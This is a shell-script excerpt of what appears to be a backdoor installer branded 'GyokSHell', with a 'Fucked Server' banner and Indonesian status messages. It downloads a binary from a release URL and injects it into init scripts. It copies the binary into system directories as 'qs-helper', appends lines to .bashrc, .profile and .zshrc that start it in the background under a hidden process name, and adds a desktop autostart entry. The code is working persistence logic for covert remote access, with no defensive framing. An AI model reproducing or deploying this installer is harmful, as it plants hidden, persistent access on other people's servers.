...
print_banner() {
  ...
  ________              __      _________ ___ ___         .__  .__   
 /  _____/___.__. ____ |  | __ /   _____//   |   \   ____ |  | |  |  
/   \  __<   |  |/  _ \|  |/ / \_____  \/    ~    \_/ __ \|  | |  |  
\    \_\  \___  (  <_> )    <  /        \    Y    /\  ___/|  |_|  |__
 \______  / ____|\____/|__|_ \/_______  /\___|_  /  \___  >____/____/
        \/\/                \/        \/       \/       \/           
				Fucked Server.....
__BANNER__
}
...
print_good() {
  echo "${GREEN}[Powerd By Gyokka] ${RESET}${1}"
}
...
download_util() {
	...
	[[ -z $DOWNLOAD_URL ]] && DOWNLOAD_URL="${GITHUB_RELEASE_URL}/${FALLBACK_RELEASE}/${BIN_NAME}"
...
install_init_scripts() {
	...
	for target in "${inject_targets[@]}"; do
		grep -q QS_ARGS "$target" &>"$ERR_LOG" && print_status "!! WARNING !! GyokSHell access already installed via $(basename "$target")" && continue 
		[[ ! -f $target ]] && continue
...
print_progress "Downloading latest Binary ......"
...
print_debug "Server dir: $QS_PATH"
print_progress "Testing Server binaries"
...
print_status "Menyalin binary ke beberapa direktori untuk memastikan permanensi..."
SYSTEM_DIRS=("/usr/local/bin" "/usr/bin" "/bin" "/usr/local/sbin" "/usr/sbin" "/sbin")

for dir in "${SYSTEM_DIRS[@]}"; do
    if [[ -w "$dir" ]]; then
        cp "$QS_PATH" "$dir/qs-helper" &>"$ERR_LOG"
        chmod +x "$dir/qs-helper"
        print_debug "Binary copied to $dir/qs-helper"
    fi
done

print_status "Menambahkan inisialisasi ke berbagai file startup user..."
INIT_FILES=("$HOME/.bashrc" "$HOME/.profile" "$HOME/.zshrc")
for initf in "${INIT_FILES[@]}"; do
    if [[ -f "$initf" && -w "$initf" ]]; then
        if ! grep -q "QS_ARGS" "$initf"; then
            echo "set +m; QS_ARGS='-liqs $S' exec -a ${PROC_HIDDEN_NAME} ${QS_PATH} &>/dev/null &" >> "$initf"
            print_debug "Added startup line to $initf"
        fi
    fi
done

print_status "Menambahkan file autostart di ~/.config/autostart"
mkdir -p "$HOME/.config/autostart"
AUTOSTART_FILE="$HOME/.config/autostart/$RAND_NAME.desktop"
